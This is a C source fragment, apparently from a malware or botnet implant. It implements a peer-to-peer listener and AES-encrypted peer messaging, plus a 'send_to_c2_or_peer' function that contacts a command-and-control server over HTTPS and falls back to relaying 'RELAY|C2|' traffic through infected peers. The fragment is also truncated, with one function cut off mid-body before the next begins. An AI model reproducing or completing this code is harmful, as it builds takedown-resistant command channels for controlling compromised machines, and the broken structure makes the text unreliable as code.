void *peer_server_thread(void *arg)
{
    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in addr = {
        .sin_family = AF_INET, .sin_port = htons(PEER_TCP_PORT), .sin_addr.s_addr = INADDR_ANY};
    bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr));
    listen(listen_fd, 10);
    while (1)
    {
        struct sockaddr_in client;
        socklen_t clen = sizeof(client);
        int client_fd = accept(listen_fd, (struct sockaddr *)&client, &clen);
        if (client_fd < 0)
            continue;
        pthread_t tid;
        pthread_create(&tid, NULL, handle_peer_connection, (void *)(intptr_t)client_fd);
        pthread_detach(tid);
    }
    return NULL;
}

char *send_to_peer(peer_t *peer, const char *data, int *out_len)
{
    if (peer->fd < 0)
    {
        peer->fd = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(peer->fd, (struct sockaddr *)&peer->addr, sizeof(peer->addr)) < 0)
        {
            peer->fd = -1;
            return NULL;
        }
        peer->state = 1;
    }
    unsigned char iv[16];
    RAND_bytes(iv, 16);
    int enc_len;
    unsigned char *enc =
        aes256_cfb_encrypt(AES_KEY, iv, (unsigned char *)data, strlen(data), &enc_len);
    if (!enc)
        return NULL;
    p2p_header_t hdr = {
        .magic = PEER_MAGIC, .version = PEER_VERSION, .type = 2, .payload_len = enc_len};
    memcpy(hdr.iv, iv, 16);
    write(peer->fd, &hdr, sizeof(hdr));
    write(peer->fd, enc, enc_len);
    free(enc);
    p2p_header_t resp_hdr;
    if (read(peer->fd, &resp_hdr, sizeof(resp_hdr)) != sizeof(resp_hdr))
        return NULL;
    if (resp_hdr.magic != PEER_MAGIC)
        return NULL;
    uint8_t *cipher = malloc(resp_hdr.payload_len);
    if (!cipher)
        return NULL;
    read(peer->fd, cipher, resp_hdr.payload_len);
    int plain_len;
    char *plain =
        (char *)aes256_cfb_decrypt(AES_KEY, resp_hdr.iv, cipher, resp_hdr.payload_len, &plain_len);
    free(cipher);
    if (!plain)
        return NULL;

char *send_to_c2_or_peer(const char *url, const char *method, const char *data, int *out_len)
{
    char *resp = https_request(url, method, data);
    if (resp)
    {
        *out_len = strlen(resp);
        return resp;
    }
    pthread_mutex_lock(&g_peer_lock);
    peer_t *chosen = NULL;
    for (int i = 0; i < g_peer_count; i++)
    {
        if (g_peers[i].state == 1 || g_peers[i].is_gateway)
        {
            chosen = &g_peers[i];
            break;
        }
    }
    pthread_mutex_unlock(&g_peer_lock);
    if (!chosen)
        return NULL;
    char relay_buf[8192];
    snprintf(relay_buf, sizeof(relay_buf), "RELAY|C2|%s", data ? data : "");
    char *peer_resp = send_to_peer(chosen, relay_buf, out_len);
    if (peer_resp)
    {
        return peer_resp;
    }
    return NULL;
}

